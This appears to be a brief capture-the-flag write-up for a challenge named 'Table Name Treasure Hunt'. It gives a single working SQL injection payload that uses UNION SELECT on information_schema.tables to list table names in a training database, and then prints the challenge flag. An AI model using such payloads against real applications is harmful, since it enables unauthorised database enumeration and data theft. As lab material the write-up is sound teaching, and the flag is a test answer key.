# Table Name Treasure Hunt

![image](https://github.com/6E3372/Curtin-Malaysia-CTF-2023/assets/129729880/0622a009-ed50-4bd8-8ce1-ca07bf7eda35)

## Solution

`123' UNION SELECT null, null, table_name, null, null FROM information_schema.tables WHERE table_schema = 'sqlitraining';-- -`

We got the flag

![image](https://github.com/6E3372/Curtin-Malaysia-CTF-2023/assets/129729880/ac260f5e-5b47-4966-923e-90bc3f435397)

## Flag

CURTIN_CTF{#1y!n#2Y@ng}
